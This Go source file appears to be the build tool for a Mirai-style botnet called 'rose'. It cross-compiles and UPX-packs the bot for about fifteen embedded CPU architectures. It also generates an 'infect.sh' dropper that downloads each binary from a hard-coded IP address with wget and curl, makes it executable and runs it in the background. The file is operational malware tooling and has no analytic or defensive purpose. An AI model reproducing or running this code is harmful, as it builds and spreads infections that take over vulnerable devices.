package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

var (
	Flags = []string{
		"-std=c99",
		"-static",
		"-pthread",
		"-lpthread",
	}

	Architectures = []string{
		"armv4l",
		"armv4tl",
		"armv5l",
		"armv6l",
		"i486",
		"i586",
		"i686",
		"m68k",
		"mips",
		"mips64",
		"mipsel",
		"powerpc",
		"powerpc",
		"sparc",
		"x86_64",
	}
)

func AppendLine(file string, line string) {
	f, err := os.OpenFile(file, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer f.Close()

	if _, err = f.WriteString(fmt.Sprintf("%s\n", line)); err != nil {
		panic(err)
	}
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./compile <debug/release>")
		return
	}

	os.RemoveAll("build")
	os.Mkdir("build", 0777)
	Files, _ := ioutil.ReadDir("../src/lib")

	var Files_str string
	for _, File := range Files {
		Files_str += fmt.Sprintf("../src/lib/%s/*.c ", File.Name())
	}
	Files_str += "../src/*.c"

	if os.Args[1] == "debug" {
		Flags = append(Flags, "-D DEBUG")

		Err := exec.Command("bash", "-c", fmt.Sprintf("gcc %s %s -o ./build/rose_debug", strings.Join(Flags, " "), Files_str)).Run()
		if Err != nil {
			panic(Err)
		}

		return
	}

	if os.Args[1] == "cmd" {
		Flags = append(Flags, "-D DEBUG")
		fmt.Println(fmt.Sprintf("gcc %s %s -o ./build/rose_debug", strings.Join(Flags, " "), Files_str))
		return
	}

	os.Create("build/infect.sh")
	AppendLine("build/infect.sh", "#!/bin/bash")
	AppendLine("build/infect.sh", "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /")

	for _, Arch := range Architectures {
		go func(a string) {
			Err := exec.Command("bash", "-c", fmt.Sprintf("/usr/local/cross-compiler-%s/bin/%s-gcc %s %s -o ./build/rose.%s && ./upx -9 -q ./build/rose.%s", a, a, strings.Join(Flags, " "), Files_str, strings.ToUpper(a), strings.ToUpper(a))).Run()
			if Err != nil {
				fmt.Println(Err.Error(), a)
				return
			}

			fmt.Printf("Compiled %s\n", a)
			AppendLine("build/infect.sh", fmt.Sprintf("wget -O r.%s http://85.31.44.75:3333/download?arch=%s; curl -o r.%s http://85.31.44.75:3333/download?arch=%s;chmod 777 *;./r.%s bash &", strings.ToUpper(a), strings.ToUpper(a), strings.ToUpper(a), strings.ToUpper(a), strings.ToUpper(a)))
		}(Arch)
	}

	select {}
}
